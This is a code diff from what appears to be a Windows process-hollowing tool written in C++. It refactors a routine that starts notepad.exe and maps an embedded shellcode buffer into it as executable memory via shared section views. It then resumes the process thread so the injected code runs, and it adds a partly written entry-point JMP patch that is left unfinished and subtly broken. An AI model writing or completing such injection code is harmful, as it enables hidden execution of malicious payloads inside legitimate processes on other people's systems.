@@ -2,7 +2,7 @@
 #include "define.h"
 #include "datastruct.h"
 #include "hkutil.h"
-#include "hktarget.h"
+#include "hkprocess.h"
 #include "hklocal.h"
 
 bool hk_local::hollowTarget(DWORD PID) noexcept {
@@ -16,7 +16,7 @@ bool hk_local::hollowTarget(DWORD PID) noexcept {
   HANDLE hRThread = NULL;
   DWORD idRThread = 0;
   LPCSTR processPath = "C:\\Windows\\System32\\notepad.exe";
-  LPVOID tgtSectionView = nullptr;
+  LPVOID pTgtSectionView = nullptr;
   ULONG retLength = 0;
   LUID privID{};
 
@@ -39,30 +39,32 @@ bool hk_local::hollowTarget(DWORD PID) noexcept {
 
   LOG("Creating target process data structure.");*/
 
-  hkTarget targetProc(processPath);
+  hkProcess targetProc(processPath);
   hkShellCode shellCode(hk_util::shellCode, hk_util::shellCodeSize);
 
-  if (!(tgtSectionView = injectCode(&targetProc, &shellCode))) {
+  if (!(pTgtSectionView = mapCode(&targetProc, &shellCode))) {
     LOG("ERROR: Shell code injection failed. Error code:" << GetLastError());
         return false;
   }
+
+  injectAtEntry(&targetProc, &pTgtSectionView);
 
   if(targetProc.resetContext()) {
     LOG("WARNING: Failed to properly restore context for the target process "
         "thread. Error Code: "
         << GetLastError());
   };
-  ResumeThread(targetProc.hThread());
+  ResumeThread(targetProc.hThread);
 
   // cleanup
   _getch();
   CloseHandle(hRThread);
-  TerminateProcess(targetProc.hProcess(), 0);
+  TerminateProcess(targetProc.hProcess, 0);
 
   return true;
 }
 
-void* hk_local::injectCode(hkTarget* pTarget, hkShellCode* pCode) noexcept {
+void* hk_local::mapCode(hkProcess* pTarget, hkShellCode* pCode) noexcept {
   
   HANDLE hSection = NULL;
   LARGE_INTEGER sectionSize{};
@@ -84,9 +86,9 @@ void* hk_local::injectCode(hkTarget* pTarget, hkShellCode* pCode) noexcept {
                      NULL, &pCode->size, 2, NULL, PAGE_READWRITE);
   LOG("Mapped local section view at 0x" << std::hex << lpSectionLocal);
 
-  LOG("Mapping target section view for PID " << pTarget->dwProcessId()
+  LOG("Mapping target section view for PID " << std::dec << pTarget->dwProcessId
                                              << "...");
-  if (hkMapViewOfSection(hSection, pTarget->hProcess(), &lpSectionTarget,
+  if (hkMapViewOfSection(hSection, pTarget->hProcess, &lpSectionTarget,
                          NULL, NULL, NULL, &pCode->size, 2, NULL,
                          PAGE_EXECUTE_READ) != 0) {
     LOG("ERROR: failed to map target section view. Error code: "
@@ -105,4 +107,14 @@ void* hk_local::injectCode(hkTarget* pTarget, hkShellCode* pCode) noexcept {
   CloseHandle(hSection);
 
   return lpSectionTarget;
+}
+
+DWORD hk_local::injectAtEntry(hkProcess* pTarget, void* pCodeView) noexcept {
+
+  BYTE jmpCode[9];
+  jmpCode[0] = 0xE9;        // JMP
+  uint64_t* jmpPtr = (uint64_t*)&jmpCode[1];
+  *jmpPtr = 0x00000000;
+
+  return 0;     // SUCCESS
 }
